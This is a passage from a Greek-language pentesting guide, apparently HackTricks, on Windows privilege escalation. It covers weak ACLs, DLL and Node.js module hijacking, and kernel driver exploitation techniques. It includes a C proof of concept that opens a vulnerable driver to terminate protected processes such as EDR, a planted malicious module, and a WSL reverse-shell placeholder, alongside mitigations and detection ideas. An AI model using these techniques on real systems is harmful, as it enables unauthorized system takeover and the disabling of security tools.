`scriptPath` στο αντικείμενο χρήστη AD, επιβεβαιώστε ότι η διαδρομή script είναι εγγράψιμη και ότι υπάρχει πραγματική σύνδεση ή προγραμματισμένη διεργασία που εκτελείται ως ο χρήστης-στόχος, προτού τη θεωρήσετε εκτέλεση μεταξύ χρηστών. Για περαιτέρω έλεγχο ομάδων απαιτείται ξεχωριστή επαλήθευση των πραγματικών αποτελεσματικών δικαιωμάτων AD.

#### Ταυτότητα self-hosted agent του Azure Pipelines

Για ένα έργο Azure DevOps Server ή Azure Pipelines, διαχωρίστε το δικαίωμα **δημιουργίας ή επεξεργασίας** ενός pipeline από το δικαίωμα **τοποθέτησής του σε ουρά** και χρήσης του επιλεγμένου agent pool· η [Microsoft τεκμηριώνει ξεχωριστά τα δικαιώματα pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) και την [εξουσιοδότηση pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Αν ένας λογαριασμός με χαμηλότερα δικαιώματα μπορεί να υποβάλει ένα βήμα script και να εκτελέσει αυτό το pipeline σε self-hosted agent Windows, το βήμα εκτελείται ως ο [ρυθμισμένος λογαριασμός λειτουργικού συστήματος του agent](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Επιβεβαιώστε το ακριβές pipeline, τους περιορισμούς κλάδου/πόρου, το εξουσιοδοτημένο pool, την εκτελέσιμη εργασία και την ταυτότητα της υπηρεσίας agent πριν ισχυριστείτε ότι υπάρχει μετάβαση μεταξύ χρηστών ή σε SYSTEM. Ένας εγκατεστημένος agent, ένας ρόλος έργου ή δικαίωμα εγγραφής στο αποθετήριο αποτελούν μόνο ενδείξεις προς διερεύνηση· εξετάστε τα δικαιώματα και τα τοπικά μεταδεδομένα υπηρεσίας χωρίς να ξεκινήσετε build κατά την παθητική απαρίθμηση.

#### Διαπιστευτήρια Microsoft Entra Connect Sync

Η [Microsoft διακρίνει](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) τον **λογαριασμό υπηρεσίας ADSync**, ο οποίος εκτελεί την υπηρεσία συγχρονισμού και αποκτά πρόσβαση στη βάση δεδομένων SQL, από τον **λογαριασμό σύνδεσης AD DS**, τα δικαιώματα καταλόγου του οποίου εξαρτώνται από τις ρυθμισμένες δυνατότητες συγχρονισμού. Τα διαπιστευτήρια σύνδεσης αποθηκεύονται κρυπτογραφημένα σε αυτήν τη βάση δεδομένων, ενώ το υλικό κλειδιού [προστατεύεται από το DPAPI στο πλαίσιο του λογαριασμού υπηρεσίας ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Μια εγκατεστημένη υπηρεσία συγχρονισμού, μια ομάδα με όνομα που υποδηλώνει τοπικό διαχειριστικό ρόλο ή η απλή ορατότητα της βάσης δεδομένων δεν αποδεικνύουν από μόνα τους ότι υπάρχουν αποκρυπτογραφήσιμα διαπιστευτήρια ή δυνατότητα κλιμάκωσης δικαιωμάτων στον τομέα. Εξετάστε ξεχωριστά τα πραγματικά δικαιώματα ανάγνωσης της βάσης δεδομένων, την πρόσβαση στον λογαριασμό υπηρεσίας/κλειδί, τη διάταξη εγκατάστασης και SQL, την ταυτότητα της ρυθμισμένης σύνδεσης και τα πραγματικά δικαιώματα AD αυτής της ταυτότητας. Η συνήθης απαρίθμηση πρέπει να εμφανίζει μόνο μεταδεδομένα υπηρεσίας και πρόσβασης, όχι να ανακτά ή να εμφανίζει τα αποθηκευμένα μυστικά.

#### Δικαιώματα DLL υποστήριξης προγραμμάτων οδήγησης εκτυπωτή

Ένα εγκατεστημένο πρόγραμμα οδήγησης εκτυπωτή μπορεί να αποθηκεύει DLL υποστήριξης στο `C:\ProgramData` και να τα φορτώνει σε μια διεργασία εκτύπωσης με αυξημένα δικαιώματα. Ελέγξτε τον ακριβή κατάλογο του προγράμματος οδήγησης και τα ACL των DLL, συμπεριλαμβανομένων των γονικών καταλόγων και των reparse points, ακόμη κι αν δεν επιτρέπεται η απαρίθμηση WMI εκτυπωτών. Για το [πρόβλημα προγράμματος οδήγησης εκτυπωτή Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), η αναφερόμενη διαδρομή ήταν `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`· [η αρχική αποκάλυψη](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) περιγράφει φόρτωση DLL από το `PrintIsolationHost.exe`. Ένα εγγράψιμο ACL αποτελεί μόνο ένδειξη προς διερεύνηση: επαληθεύστε την πραγματική δυνατότητα εγγραφής αφού ληφθούν υπόψη οι καταχωρίσεις άρνησης, ότι το σχετικό πρόγραμμα οδήγησης είναι εγκατεστημένο και φορτώνει το αρχείο με προνομιακή ταυτότητα, καθώς και αν ο προμηθευτής έχει διορθώσει την εγκατάσταση μέσω ενημερωμένου προγράμματος οδήγησης ή προγράμματος ασφαλείας. Μην συμπεραίνετε ότι υπάρχει ευπάθεια μόνο από το όνομα του καταλόγου ή την έκδοση του προγράμματος οδήγησης.

### Δικαιώματα εγγραφής

Ελέγξτε αν μπορείτε να τροποποιήσετε κάποιο αρχείο ρυθμίσεων ώστε να διαβάσετε κάποιο ειδικό αρχείο ή αν μπορείτε να τροποποιήσετε κάποιο εκτελέσιμο αρχείο που πρόκειται να εκτελεστεί από λογαριασμό Administrator (schedtasks).

Ένας τρόπος εντοπισμού αδύναμων δικαιωμάτων σε φακέλους/αρχεία του συστήματος είναι ο εξής:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Persistence/εκτέλεση μέσω αυτόματης φόρτωσης plugin του Notepad++

Το Notepad++ φορτώνει αυτόματα κάθε DLL plugin στους υποφακέλους `plugins`. Αν υπάρχει εγκατάσταση portable/αντίγραφο με δυνατότητα εγγραφής, η τοποθέτηση ενός κακόβουλου plugin προσφέρει αυτόματη εκτέλεση κώδικα μέσα στο `notepad++.exe` σε κάθε εκκίνηση (συμπεριλαμβανομένων των `DllMain` και των callbacks των plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Εκτέλεση κατά την εκκίνηση

**Έλεγξε αν μπορείς να αντικαταστήσεις κάποια εγγραφή μητρώου ή κάποιο binary που πρόκειται να εκτελεστεί από διαφορετικό χρήστη.**\
**Διάβασε** την **ακόλουθη σελίδα** για να μάθεις περισσότερα σχετικά με ενδιαφέρουσες **τοποθεσίες autoruns για κλιμάκωση προνομίων**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Οδηγοί

Αναζήτησε πιθανούς **περίεργους/ευάλωτους drivers τρίτων κατασκευαστών**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Αν ένας driver εκθέτει ένα αυθαίρετο primitive ανάγνωσης/εγγραφής στον kernel (συνηθισμένο σε κακοσχεδιασμένους IOCTL handlers), μπορείτε να κάνετε privilege escalation κλέβοντας απευθείας ένα SYSTEM token από τη μνήμη του kernel.<sup>[[13]](#references)</sup> Δείτε την τεχνική βήμα προς βήμα εδώ:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Για bugs συνθηκών αγώνα, όπου η ευάλωτη κλήση ανοίγει ένα path του Object Manager που ελέγχεται από τον attacker, η σκόπιμη επιβράδυνση της αναζήτησης (με components μέγιστου μήκους ή βαθιές αλυσίδες καταλόγων) μπορεί να παρατείνει το παράθυρο από μικροδευτερόλεπτα σε δεκάδες μικροδευτερόλεπτα:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### UAF σε cancel-safe queues, disclosures από paged-pool και pivots σε I/O ring

Ορισμένα Windows kernel LPE chains μπορούν να προκύψουν από δύο bugs που είναι αδύναμα από μόνα τους: ένα **race στη διάρκεια ζωής μιας cancel-safe queue** που ελευθερώνει ένα request/CBD ενώ το lock της queue παραμένει κλειδωμένο, και ένα disclosure **απελευθέρωσης του lock πριν από την αντιγραφή** που διαρρέει μια ελευθερωμένη paged-pool allocation κατά τη διάρκεια του `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Σημειώσεις για auditing και exploitation:

- **Ελευθέρωση υπό lock + cancel μετά**: αναζητήστε ένα success path που εκτελεί **Acquire -> CompleteRequest/free -> Release**, ενώ το cancel path εκτελεί **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Αν το success path φτάσει στα `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` πριν από την απελευθέρωση του CBDQ/CSQ lock, ένα thread που έχει μπλοκαριστεί στο `NtCancelIoFileEx -> IopCsqCancelRoutine` μπορεί να συνεχίσει αργότερα και να περάσει ένα ελευθερωμένο `PFLT_CALLBACK_DATA` πίσω στο remove callback του driver.
- **Ανακτήστε το ελευθερωμένο queue object** με μια paged-pool allocation ίδιου μεγέθους, ελεγχόμενη από τον attacker. Τα `NPFS` Data Queue Entries είναι χρήσιμα επειδή το payload και το μέγεθος είναι ελεγχόμενα, ενώ μπορείτε αργότερα να τα εξετάσετε με pipe read/peek operations. Αν το ελευθερωμένο object ενσωματώνει list links, αντικαταστήστε τα με μια **κυκλική λίστα από πλαστά request nodes στη user memory**, ώστε ο driver να επεξεργάζεται επανειλημμένα request structures που ορίζει ο attacker, αντί να σταματήσει στο αρχικό list head.
- **Αναβαθμίστε ένα προβλέψιμο write**: αν το πλαστό request ανακατευθύνει έναν nested context pointer που χρησιμοποιείται σε bookkeeping writes (timestamps / QPC / πεδία δίπλα σε refcount), μπορεί να αποκτήσετε ένα kernel write με **ελεγχόμενη διεύθυνση αλλά όχι ελεγχόμενη τιμή**. Σε αυτή την περίπτωση, στοχεύστε το πεδίο **length/size** ενός sprayed pool object αντί για έναν τελικό code/data pointer και, στη συνέχεια, δοκιμάστε διαδοχικά τα αντικείμενα του spray μέχρι το αλλοιωμένο object να δώσει ένα **out-of-bounds paged-pool read**.
- **Μοτίβο disclosure ευάλωτο σε race**: κάθε syscall που εκτελεί `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` είναι ισχυρός υποψήφιος. Η αξιοπιστία βελτιώνεται όταν ο attacker μπορεί να αυξήσει το μέγεθος του αντιγραμμένου buffer (για παράδειγμα, προσθέτοντας πολλές list/resource entries που αυξάνουν το τελικό μέγεθος της allocation του serializer), επειδή η μεγαλύτερη αντιγραφή διευρύνει το παράθυρο αντικατάστασης χωρίς απαραίτητα να προκαλέσει crash στο μηχάνημα.
- **Στόχοι αναπλήρωσης με πολλούς pointers**: οι registered-buffer arrays του Windows **I/O ring** είναι εξαιρετικοί στόχοι disclosure, επειδή το μέγεθος της paged-pool allocation τους ελέγχεται από τον attacker (`8 * regBufferCnt`) και κάθε στοιχείο είναι ένας kernel pointer προς ένα `_IOP_MC_BUFFER_ENTRY`. Διαρρεύστε έναν από αυτούς τους arrays και ανακτήστε το περιβάλλον `IORING_OBJECT`, έπειτα αλλοιώστε τα **`RegBuffers`** και **`RegBuffersCount`**, ώστε οι επόμενες I/O ring operations να χρησιμοποιούν πλαστά entries που έχει δημιουργήσει ο attacker και να παρέχουν αυθαίρετη ανάγνωση/εγγραφή στον kernel. Αν το μόνο διαθέσιμο write σάς δίνει ένα σταθερό byte (για παράδειγμα από το `KUSER_SHARED_DATA+0x14`), χρησιμοποιήστε **μη ευθυγραμμισμένα, επικαλυπτόμενα writes** για να δημιουργήσετε έναν user pointer με επαναλαμβανόμενα bytes, όπως το `0x0101010101010101`, αντιστοιχίστε τον με `VirtualAlloc` και τοποθετήστε εκεί τον πλαστό registered-buffer array.<sup>[[30]](#references)</sup>

Χρήσιμες ενδείξεις για debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Μόλις αποκτήσεις αυθαίρετη ανάγνωση/εγγραφή kernel μέσω του αλλοιωμένου I/O ring, κλέψε ένα SYSTEM token χρησιμοποιώντας την τυπική post-primitive διαδικασία:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives αλλοίωσης μνήμης registry hive

Οι σύγχρονες ευπάθειες hive επιτρέπουν τη δημιουργία προβλέψιμων διατάξεων μνήμης, την κατάχρηση εγγράψιμων απογόνων των HKLM/HKU και τη μετατροπή αλλοίωσης metadata σε υπερχειλίσεις kernel paged-pool χωρίς custom driver. Μάθε όλη την αλυσίδα εδώ:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Σύγχυση τύπων σε direct mode του `RtlQueryRegistryValues` μέσω διαδρομών που ελέγχει ο attacker

Ορισμένοι drivers δέχονται μια διαδρομή registry από το userland, ελέγχουν μόνο ότι είναι έγκυρη συμβολοσειρά UTF-16 και μετά καλούν `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` με `RTL_QUERY_REGISTRY_DIRECT` σε μια scalar μεταβλητή της στοίβας, όπως `int readValue`. Αν λείπει το `RTL_QUERY_REGISTRY_TYPECHECK`, το `EntryContext` ερμηνεύεται σύμφωνα με τον **πραγματικό** τύπο του registry και όχι σύμφωνα με τον τύπο που περίμενε ο developer.

Αυτό δημιουργεί δύο χρήσιμα primitives:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: μια απόλυτη διαδρομή `\Registry\...` που ελέγχει ο χρήστης επιτρέπει στον driver να αναζητά κλειδιά που επιλέγει ο attacker, να αποκαλύπτει την ύπαρξή τους μέσω κωδικών επιστροφής/logs και μερικές φορές να διαβάζει τιμές στις οποίες ο caller δεν θα είχε άμεση πρόσβαση.
- **Αλλοίωση μνήμης kernel**: ένας προορισμός scalar, όπως το `&readValue`, υφίσταται σύγχυση τύπων ως `REG_QWORD`, `UNICODE_STRING` ή buffer binary καθορισμένου μεγέθους, ανάλογα με τον τύπο της τιμής registry.

Σημειώσεις για πρακτική εκμετάλλευση:

- **Μετριασμός στα Windows 8+**: αν το query αφορά ένα **untrusted hive** με `RTL_QUERY_REGISTRY_DIRECT`, αλλά χωρίς `RTL_QUERY_REGISTRY_TYPECHECK`, οι κλήσεις από kernel προκαλούν crash με `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Για να παραμείνει εκμεταλλεύσιμη η ευπάθεια, αναζήτησε **κλειδιά που ελέγχει ο attacker μέσα σε trusted system hives**, αντί να τοποθετείς τιμές κάτω από το `HKCU`.
- **Προετοιμασία σε trusted hive**: χρησιμοποίησε το NtObjectManager για να απαριθμήσεις εγγράψιμους απογόνους του `\Registry\Machine` και εκτέλεσε ξανά τη σάρωση με διπλότυπο token **low-integrity**, ώστε να εντοπίσεις κλειδιά προσβάσιμα από sandboxed περιβάλλοντα:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: μια απευθείας εγγραφή 8 byte σε ένα `int` 4 byte αλλοιώνει παρακείμενα δεδομένα της στοίβας και μπορεί να αντικαταστήσει μερικώς έναν κοντινό δείκτη callback/συνάρτησης.
- **`REG_SZ` / `REG_EXPAND_SZ`**: η direct mode αναμένει το `EntryContext` να δείχνει σε ένα `UNICODE_STRING`. Αν ο κώδικας φορτώσει πρώτα ένα `REG_DWORD` που ελέγχεται από τον attacker σε μια scalar μεταβλητή της στοίβας και στη συνέχεια επαναχρησιμοποιήσει το ίδιο buffer για ανάγνωση string, ο attacker ελέγχει τα `Length`/`MaximumLength` και επηρεάζει μερικώς τον δείκτη `Buffer`, προκαλώντας μια μερικώς ελεγχόμενη εγγραφή στον kernel.
- **`REG_BINARY`**: για μεγάλα binary δεδομένα, η direct mode αντιμετωπίζει το πρώτο `LONG` στο `EntryContext` ως μέγεθος buffer με πρόσημο. Αν μια προηγούμενη ανάγνωση `REG_DWORD` αφήσει μια **αρνητική** τιμή που ελέγχεται από τον attacker στην επαναχρησιμοποιημένη scalar μεταβλητή, το επόμενο query `REG_BINARY` αντιγράφει bytes του attacker απευθείας σε παρακείμενες θέσεις της στοίβας, κάτι που συχνά αποτελεί τον πιο απλό τρόπο για πλήρη αντικατάσταση ενός δείκτη callback.

Ισχυρό μοτίβο για hunting: **ετερογενείς αναγνώσεις registry στην ίδια μεταβλητή της στοίβας χωρίς επαναρχικοποίησή της**. Κάντε grep για `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, δείκτες `EntryContext` που επαναχρησιμοποιούνται και διαδρομές κώδικα όπου η πρώτη ανάγνωση registry καθορίζει αν θα γίνει δεύτερη ανάγνωση.

#### Κατάχρηση της απουσίας του FILE_DEVICE_SECURE_OPEN σε αντικείμενα συσκευών (LPE + εξουδετέρωση EDR)

Ορισμένοι υπογεγραμμένοι drivers τρίτων δημιουργούν το αντικείμενο συσκευής τους με ισχυρό SDDL μέσω του IoCreateDeviceSecure, αλλά ξεχνούν να ορίσουν το FILE_DEVICE_SECURE_OPEN στο DeviceCharacteristics. Χωρίς αυτό το flag, το ασφαλές DACL δεν επιβάλλεται όταν ανοίγεται η συσκευή μέσω διαδρομής που περιέχει ένα επιπλέον στοιχείο, επιτρέποντας σε οποιονδήποτε μη προνομιούχο χρήστη να αποκτήσει handle χρησιμοποιώντας μια διαδρομή namespace όπως:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (από πραγματικό περιστατικό)

Μόλις ένας χρήστης μπορέσει να ανοίξει τη συσκευή, μπορούν να καταχραστούν τα προνομιούχα IOCTL που εκθέτει ο driver για LPE και tampering. Παραδείγματα δυνατοτήτων που έχουν παρατηρηθεί στην πράξη:
- Επιστροφή handles πλήρους πρόσβασης σε αυθαίρετες διεργασίες (κλοπή token / κέλυφος SYSTEM μέσω DuplicateTokenEx/CreateProcessAsUser).
- Απεριόριστη ανάγνωση/εγγραφή raw disk (tampering εκτός σύνδεσης, τεχνικές persistence κατά την εκκίνηση).
- Τερματισμός αυθαίρετων διεργασιών, συμπεριλαμβανομένων των Protected Process/Light (PP/PPL), επιτρέποντας την εξουδετέρωση AV/EDR από το userland μέσω του kernel.

Ελάχιστο μοτίβο PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigations για developers
- Ορίζετε πάντα το FILE_DEVICE_SECURE_OPEN κατά τη δημιουργία device objects που προορίζονται να περιορίζονται μέσω DACL.
- Επικυρώνετε το context του caller για privileged operations. Προσθέτετε ελέγχους PP/PPL πριν επιτρέψετε τον τερματισμό διεργασιών ή την επιστροφή handles.
- Περιορίζετε τα IOCTLs (access masks, METHOD_*, επικύρωση εισόδου) και εξετάζετε brokered models αντί για άμεσα kernel privileges.

Ιδέες ανίχνευσης για defenders
- Παρακολουθείτε ανοίγματα ύποπτων ονομάτων συσκευών από user mode (π.χ., \\ .\\amsdk*) και συγκεκριμένες ακολουθίες IOCTL που υποδηλώνουν κατάχρηση.
- Εφαρμόζετε τη vulnerable driver blocklist της Microsoft (HVCI/WDAC/Smart App Control) και διατηρείτε δικές σας allow/deny lists.


## PATH DLL Hijacking

Αν έχετε **write permissions μέσα σε έναν φάκελο που υπάρχει στο PATH**, ίσως μπορείτε να κάνετε hijack σε ένα DLL που φορτώνεται από μια διεργασία και να **κλιμακώσετε τα privileges**.<sup>[[2]](#references)</sup>

Ελέγξτε τα permissions όλων των φακέλων στο PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Για περισσότερες πληροφορίες σχετικά με το πώς να καταχραστείτε αυτόν τον έλεγχο:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking της επίλυσης module του Node.js / Electron μέσω του `C:\node_modules`

Πρόκειται για μια παραλλαγή **Windows uncontrolled search path** που επηρεάζει εφαρμογές **Node.js** και **Electron** όταν εκτελούν ένα bare import, όπως `require("foo")`, και το αναμενόμενο module **λείπει**.<sup>[[20]](#references)</sup>

Το Node επιλύει τα packages ανεβαίνοντας στη δενδρική δομή καταλόγων και ελέγχοντας τους φακέλους `node_modules` σε κάθε γονικό κατάλογο. Στα Windows, αυτή η αναζήτηση μπορεί να φτάσει στη ρίζα του δίσκου, επομένως μια εφαρμογή που εκκινείται από το `C:\Users\Administrator\project\app.js` μπορεί τελικά να ελέγξει τα εξής:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Αν ένας **χρήστης με χαμηλά δικαιώματα** μπορεί να δημιουργήσει το `C:\node_modules`, μπορεί να τοποθετήσει ένα κακόβουλο `foo.js` (ή έναν φάκελο package) και να περιμένει μέχρι μια **διεργασία Node/Electron με υψηλότερα δικαιώματα** να επιλύσει την εξάρτηση που λείπει. Το payload εκτελείται στο πλαίσιο ασφαλείας της διεργασίας-θύματος, επομένως αυτό οδηγεί σε **LPE** κάθε φορά που ο στόχος εκτελείται ως administrator, από elevated scheduled task/service wrapper ή από προνομιούχα εφαρμογή desktop που εκκινείται αυτόματα.

Αυτό είναι ιδιαίτερα συνηθισμένο όταν:

- μια εξάρτηση δηλώνεται στο `optionalDependencies`<sup>[[22]](#references)</sup>
- μια βιβλιοθήκη τρίτου μέρους περικλείει το `require("foo")` σε `try/catch` και συνεχίζει αν αποτύχει
- ένα package αφαιρέθηκε από τα production builds, παραλείφθηκε κατά τη δημιουργία του package ή απέτυχε να εγκατασταθεί
- το ευάλωτο `require()` βρίσκεται βαθιά μέσα στο δέντρο εξαρτήσεων και όχι στον κύριο κώδικα της εφαρμογής

### Αναζήτηση ευάλωτων στόχων

Χρησιμοποιήστε το **Procmon** για να επιβεβαιώσετε τη διαδρομή επίλυσης:<sup>[[23]](#references)</sup>

- Φιλτράρετε με `Process Name` = το εκτελέσιμο αρχείο-στόχος (`node.exe`, το EXE της εφαρμογής Electron ή η διεργασία wrapper)
- Φιλτράρετε με `Path` `contains` `node_modules`
- Εστιάστε στα `NAME NOT FOUND` και στο τελικό επιτυχημένο άνοιγμα κάτω από το `C:\node_modules`

Χρήσιμα μοτίβα κατά την ανασκόπηση κώδικα σε αποσυμπιεσμένα αρχεία `.asar` ή στις πηγές της εφαρμογής:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Εντοπίστε το **όνομα του πακέτου που λείπει** μέσω του Procmon ή με έλεγχο του πηγαίου κώδικα.
2. Δημιουργήστε τον root κατάλογο αναζήτησης, αν δεν υπάρχει ήδη:

```powershell
mkdir C:\node_modules
```

3. Τοποθετήστε ένα module με το ακριβώς αναμενόμενο όνομα:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Ενεργοποιήστε την εφαρμογή-θύμα. Αν η εφαρμογή επιχειρήσει `require("foo")` και η νόμιμη ενότητα απουσιάζει, το Node ενδέχεται να φορτώσει το `C:\node_modules\foo.js`.

Πραγματικά παραδείγματα προαιρετικών ενοτήτων που απουσιάζουν και ταιριάζουν σε αυτό το μοτίβο είναι οι `bluebird` και `utf-8-validate`, αλλά η **τεχνική** είναι το επαναχρησιμοποιήσιμο μέρος: εντοπίστε οποιοδήποτε **bare import** που θα επιλύσει μια προνομιακή διεργασία Windows Node/Electron.

### Ιδέες για εντοπισμό και ενίσχυση της ασφάλειας

- Δημιουργήστε ειδοποίηση όταν ένας χρήστης δημιουργεί το `C:\node_modules` ή γράφει εκεί νέα αρχεία/πακέτα `.js`.
- Αναζητήστε διεργασίες υψηλής ακεραιότητας που διαβάζουν από το `C:\node_modules\*`.
- Συμπεριλάβετε όλες τις εξαρτήσεις χρόνου εκτέλεσης στα πακέτα παραγωγής και ελέγξτε τη χρήση του `optionalDependencies`.
- Ελέγξτε τον κώδικα τρίτων για μοτίβα `try { require("...") } catch {}` που αποτυγχάνουν σιωπηρά.
- Απενεργοποιήστε τους προαιρετικούς ελέγχους, αν το υποστηρίζει η βιβλιοθήκη (για παράδειγμα, ορισμένες εγκαταστάσεις του `ws` μπορούν να αποφύγουν τον παλιό έλεγχο για `utf-8-validate` με `WS_NO_UTF_8_VALIDATE=1`).

## Δίκτυο

### Κοινόχρηστοι πόροι

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### αρχείο hosts

Ελέγξτε αν υπάρχουν άλλοι γνωστοί υπολογιστές καταχωρισμένοι στατικά στο αρχείο hosts.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Διεπαφές δικτύου & DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Ανοιχτές θύρες

Ελέγξτε για **περιορισμένες υπηρεσίες** από έξω.

```bash
netstat -ano #Opened ports?
```

Για έναν τοπικό listener, συσχετίστε το PID του με τον κάτοχο της διεργασίας, τη διαδρομή του εκτελέσιμου αρχείου και οποιαδήποτε υπηρεσία ή προγραμματισμένη εργασία τον εκκινεί. Μια υπηρεσία απομακρυσμένου ελέγχου μπορεί να παρέχει πρόσβαση ως ο χρήστης της επιφάνειας εργασίας μόνο εφόσον το επιτρέπουν ο έλεγχος ταυτότητας και οι περιορισμοί εντολών της. Μια προσαρμοσμένη εφαρμογή TCP που εκτελείται με λογαριασμό υψηλότερων προνομίων αποτελεί ξεχωριστό στόχο ελέγχου: ο listener και η διαδρομή του δυαδικού αρχείου είναι παθητικές ενδείξεις, ενώ μια αυθεντικοποιημένη οδός εκμετάλλευσης καταστροφής μνήμης απαιτεί ανάλυση του συγκεκριμένου δυαδικού αρχείου και των προσβάσιμων εισόδων του. Αν μια εκτεθειμένη θύρα φαίνεται να ανήκει σε διεργασία συστήματος, συγκρίνετέ την με το [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) πριν αποδώσετε τη σύνδεση στην υπηρεσία backend· ένας κανόνας προώθησης από μόνος του δεν αποδεικνύει ότι ο προορισμός είναι προσβάσιμος ή ευάλωτος.

### Πίνακας δρομολόγησης

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Πίνακας ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Κανόνες τείχους προστασίας

[**Δείτε αυτή τη σελίδα για εντολές σχετικές με το τείχος προστασίας**](../basic-cmd-for-pentesters.md#firewall) **(λίστα κανόνων, δημιουργία κανόνων, απενεργοποίηση, απενεργοποίηση...)**

Περισσότερες[ εντολές για απαρίθμηση δικτύου εδώ](../basic-cmd-for-pentesters.md#network)

### Υποσύστημα Windows για Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Το binary `bash.exe` μπορεί επίσης να βρεθεί στο `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Αν αποκτήσετε τον χρήστη root, μπορείτε να ακούτε σε οποιαδήποτε θύρα (την πρώτη φορά που χρησιμοποιείτε το `nc.exe` για να ακούσετε σε μια θύρα, θα εμφανιστεί μέσω GUI ένα μήνυμα που θα σας ρωτά αν το `nc` πρέπει να επιτρέπεται από το firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Για να ξεκινήσετε εύκολα το bash ως root, μπορείτε να δοκιμάσετε το `--default-user root`

